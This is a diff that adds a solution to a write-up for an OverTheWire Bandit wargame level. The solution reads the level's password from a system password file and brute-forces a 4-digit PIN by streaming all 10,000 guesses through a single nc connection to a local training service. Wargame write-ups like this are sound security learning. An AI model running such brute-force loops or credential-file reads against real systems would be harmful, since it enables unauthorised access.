@@ -11,14 +11,31 @@
 
 
 ## PURPOSE
-We must brute-force a **4-digit PIN (0000–9999)**, but do it **over a single TCP connection** to `localho
+We must brute-force a **4-digit PIN (0000–9999)**, but do it **over a single TCP connection** to `localhost:30002`. Each attempt is one line of the form:
 ```
 <bandit24_password> <4-digit_pin>
 ```
-The server replies “Wrong!” for bad guesses and prints the bandit25 password for the correct one. We’ll stream all guesses through
+The server replies “Wrong!” for bad guesses and prints the bandit25 password for the correct one. We’ll stream all guesses through one `nc` session and capture the response. First, we must get the current level’s password into a variable:
+```bash
+pass=$(cat /etc/bandit_pass/bandit24)
+```
 
+- Send all 10,000 guesses over **one** connection and save the transcript:
+  ```bash
+  { for pin in $(seq -w 0000 9999); do echo "$pass $pin"; done; } \
+  | nc localhost 30002 | tee /tmp/b25.out
+  ```
+  > If your `nc` is GNU and doesn’t close after stdin ends, add `-q 1`:
+  > ```bash
+  > { for pin in $(seq -w 0000 9999); do echo "$pass $pin"; done; } \
+  > | nc -q 1 localhost 30002 | tee /tmp/b25.out
+  > ```
 
-
+- Extract the winning line (not “Wrong!”):
+  ```bash
+  grep -iv 'wrong' /tmp/b25.out
+  ```
+  The output is the **bandit25** password. (Add its ROT13 to the header.)
 ## SOLUTIONS
 
 	~BEST~
